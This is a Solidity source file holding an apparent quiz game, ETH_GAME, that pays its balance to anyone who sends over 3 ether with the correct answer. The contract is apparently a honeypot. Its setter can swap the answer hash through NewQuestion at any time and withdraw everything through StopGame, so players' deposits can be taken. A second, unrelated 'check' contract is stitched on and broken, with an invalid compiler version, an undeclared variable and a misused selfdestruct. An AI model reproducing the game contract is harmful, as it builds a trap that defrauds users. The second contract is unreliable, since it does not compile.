pragma solidity ^0.4.20;

contract ETH_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }

    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }


    function() public payable{}
}
pragma solidity ^0.5.24;
contract check {
	uint validSender;
	constructor() public {owner = msg.sender;}
	function destroy() public {
		assert(msg.sender == owner);
		selfdestruct(this);
	}
}
